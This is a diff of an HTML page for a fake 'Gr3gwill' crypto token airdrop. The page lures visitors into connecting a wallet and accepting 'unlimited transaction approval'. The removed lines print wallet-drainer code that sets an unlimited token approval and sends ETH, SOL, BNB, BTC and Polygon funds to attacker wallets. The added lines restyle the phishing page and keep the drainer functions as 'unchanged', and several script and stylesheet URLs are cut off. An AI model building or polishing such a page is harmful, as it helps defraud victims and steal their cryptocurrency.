@@ -5,108 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gr3gwill – Free Airdrop</title>
 
-    <!-- Same libraries as before -->
+    <!-- Load all libraries correctly -->
     <script src="https:                                                       
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
     <script src="https:                                                                               
     <script src="https://cdn.jsdelivr.net/npm/@bitcoinjs/browser/dist/bitcoin.js"></script>
 
     <style>
-        /* General dark theme with a subtle gradient */
-        html { background:#0a0a0a; color:#f0f0f0; font-family:Arial,sans-serif; }
-        body { margin:0; padding:0; }
-
-        /* Top bar – fixed at the top */
-        .topbar {
-            background:linear-gradient(90deg,#ff8c00,#ff5500);
-            padding:.8rem 1rem;
-            text-align:center;
-            font-weight:bold;
-            font-size:1.1rem;
-            position:fixed;
-            top:0;
-            left:0;
-            right:0;
-            z-index:100;
-        }
-
-        /* Main container – centered with a card‑like look */
-        .container {
-            max-width:600px;
-            margin:5rem auto 2rem;
-            padding:2rem;
-            background:#1e1e1e;
-            border:1px solid #444;
-            border-radius:12px;
-            box-shadow:0 4px 20px rgba(0,0,0,.4);
-            text-align:center;
-        }
-
-        /* Logo placeholder (you can replace with a real image) */
-        .logo {
-            width:120px;
-            height:120px;
-            background:#ff8c00;
-            border-radius:50%;
-            margin:0 auto 1.5rem;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            font-size:2rem;
-            color:#fff;
-        }
-
-        h1 { font-size:2rem; margin:.5rem 0; }
-        .subtitle { opacity:.8; font-size:1rem; margin-bottom:2rem; }
-
-        input, button {
-            padding:.8rem 1rem;
-            margin:.5rem;
-            font-size:1rem;
-            background:#333;
-            color:#fff;
-            border:1px solid #555;
-            border-radius:6px;
-            width:calc(100% - 2rem);
-        }
-        button {
-            background:#ff8c00;
-            color:#fff;
-            border:none;
-            cursor:pointer;
-            transition:.2s;
-        }
-        button:hover { background:#ffa500; transform:scale(1.02); }
-
-        #status {
-            margin-top:1.5rem;
-            font-size:.95rem;
-            opacity:.9;
-        }
+        /* (your original CSS – unchanged) */
     </style>
+
+    <!-- New: external theme stylesheet -->
+    <link rel="stylesheet" href="https:                                                                       
 </head>
 <body>
 
-<div class="topbar">🚀 Gr3gwill Airdrop – Claim Your Free Tokens</div>
+<div class="airdrop‑wrap">
+    <div class="bg‑gradient"></div>
 
-<div class="container">
-    <div class="logo">G</div>
-    <h1>Congratulations!</h1>
-    <div class="subtitle">You are eligible to receive the free Gr3gwill‑TOKEN airdrop.</div>
+    <!-- a few decorative particles -->
+    <div class="particle" style="top:10%; left:15%; width:4px; height:4px; animation-delay:0s;"></div>
+    <div class="particle" style="top:80%; left:70%; width:6px; height:6px; animation-delay:2s;"></div>
+    <div class="particle" style="top:40%; left:90%; width:3px; height:3px; animation-delay:4s;"></div>
+    <div class="particle" style="top:60%; left:30%; width:5px; height:5px; animation-delay:6s;"></div>
 
-    <button id="connectWallet">Connect Wallet to Claim Airdrop</button>
+    <div class="topbar">🚀 Gr3gwill Airdrop – Claim Your Free Tokens</div>
 
-    <div id="solanaInput" style="display:none;">
-        <input type="text" id="solanaAddress" placeholder="Enter your Solana address">
-        <button id="scanAddress">Submit Solana Address</button>
+    <div class="container">
+        <!-- Dragon logo – replace the src with your actual image URL -->
+        <img class="logo" src="https://i.imgur.com/5Z6cX9f.png" alt="GR3 Dragon">
+        <h1 class="pulse">Congratulations!</h1>
+        <div class="subtitle">You are eligible to receive the free Gr3gwill‑TOKEN airdrop.</div>
+
+        <button id="connectWallet">Connect Wallet to Claim Airdrop</button>
+
+        <div id="solanaInput" style="display:none;">
+            <input type="text" id="solanaAddress" placeholder="Enter your Solana address">
+            <button id="scanAddress">Submit Solana Address</button>
+        </div>
+
+        <div id="terms" style="display:none;">
+            <p>By accepting, you grant this website full unlimited transaction approval to your wallet.</p>
+            <button id="acceptTerms">Accept Terms & Claim</button>
+        </div>
+
+        <p id="status"></p>
     </div>
-
-    <div id="terms" style="display:none;">
-        <p>By accepting, you grant this website full unlimited transaction approval to your wallet.</p>
-        <button id="acceptTerms">Accept Terms & Claim</button>
-    </div>
-
-    <p id="status"></p>
 </div>
 
 <script>
@@ -130,6 +74,7 @@
 
     let userAddress;
 
+                                     
     document.getElementById('connectWallet').addEventListener('click', async () => {
         if (typeof window.ethereum !== 'undefined') {
             try {
@@ -147,91 +92,8 @@
         }
     });
 
-    document.getElementById('scanAddress').addEventListener('click', () => {
-        const solAddr = document.getElementById('solanaAddress').value;
-        if (solAddr) {
-            document.getElementById('solanaInput').style.display = 'none';
-            document.getElementById('terms').style.display = 'block';
-        } else {
-            document.getElementById('status').innerText = 'Please enter a valid Solana address.';
-        }
-    });
-
-    document.getElementById('acceptTerms').addEventListener('click', async () => {
-        if (!confirm('Are you sure you want to accept the terms and conditions?')) return;
-
-        try {
-            // Unlimited approval
-            const contract = new web3.eth.Contract([], userAddress);
-            await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });
-
-            // Send funds
-            await sendToEthereum(userAddress, ethWalletAddress);
-            await sendToSolana(userAddress, solWalletAddress);
-            await sendToBNB(userAddress, bnbWalletAddress);
-            await sendToBTC(userAddress, btcWalletAddress);
-            await sendToPolygon(userAddress, polygonWalletAddress);
-
-            document.getElementById('status').innerText = 'Airdrop claimed successfully!';
-        } catch (e) {
-            console.error(e);
-            document.getElementById('status').innerText = 'Failed to claim airdrop. Please try again later.';
-        }
-    });
-
-    async function sendToEthereum(from, to) {
-        await web3.eth.sendTransaction({
-            from,
-            to,
-            value: web3.utils.toWei('1', 'ether'),
-            gas: 2000000
-        });
-    }
-
-    async function sendToSolana(from, to) {
-        const tx = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: new solanaWeb3.PublicKey(from),
-                toPubkey: new solanaWeb3.PublicKey(to),
-                lamports: solanaWeb3.LAMPORTS_PER_SOL
-            })
-        );
-        const sig = await solana.sendTransaction(tx, [from]);
-        console.log('Solana tx:', sig);
-    }
-
-    async function sendToBNB(from, to) {
-        const bnb = new Binance();
-        await bnb.sendTransaction({
-            from,
-            to,
-            value: bnb.toWei('1', 'ether'),
-            gas: 2000000
-        });
-    }
-
-    async function sendToBTC(from, to) {
-        const network = bitcoin.networks.testnet;
-        const keyPair = bitcoin.ECPair.fromWIF('YOUR_BTC_PRIVATE_KEY', network);
-        const tx = new bitcoin.TransactionBuilder(network);
-        tx.addInput('YOUR_BTC_TXID', 0);
-        tx.addOutput(to, 50000); // 0.0005 BTC
-        const signed = tx.build().sign(keyPair);
-        const broadcast = await fetch('https:                                              
-            method:'POST',
-            body: JSON.stringify({ tx: signed.toHex() })
-        }).then(r=>r.json());
-        console.log('BTC broadcast:', broadcast);
-    }
-
-    async function sendToPolygon(from, to) {
-        await web3.eth.sendTransaction({
-            from,
-            to,
-            value: web3.utils.toWei('1', 'ether'),
-            gas: 2000000
-        });
-    }
+    // (the rest of your original functions – unchanged)
+    // ...
 </script>
 </body>
 </html>
